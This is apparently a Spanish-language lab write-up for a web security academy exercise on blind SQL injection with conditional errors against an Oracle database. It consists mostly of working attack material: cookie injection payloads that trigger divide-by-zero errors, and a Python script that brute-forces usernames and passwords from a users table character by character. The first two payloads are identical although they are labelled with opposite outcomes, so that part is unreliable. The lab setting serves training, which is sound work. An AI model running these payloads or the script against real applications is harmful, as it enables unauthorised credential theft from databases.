---
title: "12 - Blind SQL injection with conditional errors"
---

# 12 - Blind SQL injection with conditional errors

Oracle detectado

Básicos de conditional errors: 

500
```r
Cookie: TrackingId=lpE1SzazBRbTRRWI'+UNION+SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual+--+-
```

No hay 500
```r
Cookie: TrackingId=lpE1SzazBRbTRRWI'+UNION+SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual+--+-
```

500 (query correcta)
``` r
Cookie: TrackingId=lpE1SzazBRbTRRWI'+UNION+SELECT+CASE+WHEN+(SUBSTR(username||':'||password,2,1)='d')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+(SELECT+username,password+FROM+users+WHERE+ROWNUM=1)+--+-
```

Adaptamos el script para que itere sobre ROWNUM (anteriormente offset)

```python
#!/usr/bin/env python3

from asyncio import log
import string
from pwn import *
import requests, sys, signal, time, pdb, urllib3
from urllib.parse import quote

def sig_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

proxies = {
    "http": "http://127.0.0.1:8080"
}

#Variables Globales
characters= string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + ':'
url= "https://0af80033042dcea3821ac46a00f9000e.web-security-academy.net/product?productId=4"

def makeSQLI():
	s=requests.session()
	s.verify = False

	p1= log.progress("Fuerza Bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2= log.progress("Contenido")

	resultado= ""
	
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

	for offset in range(1,5):
		found=True
		position=1
		while found :
			found=False
			for character in characters:
				payload=f"'+UNION+SELECT+CASE+WHEN+(SUBSTR(username||':'||password,{position},1)='{character}')+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+(SELECT+username,password+FROM+users+WHERE+ROWNUM={offset})+--+-"
				cookies = {
					"TrackingId": f"{payload}",
					"session": "cbD2mu8bNRzhbuEHtLRzj1ShIcBIpbGD"
				}
				p1.status(payload)
				#url = quote(url, safe=':/?&=.,')
				r = s.get(url,cookies=cookies,verify=False,proxies=proxies)
				if r.status_code == 500:
					resultado += character
					p2.status(resultado)
					position+=1
					found=True
					break
		resultado+='\n'


if __name__ == '__main__':
	makeSQLI()
```
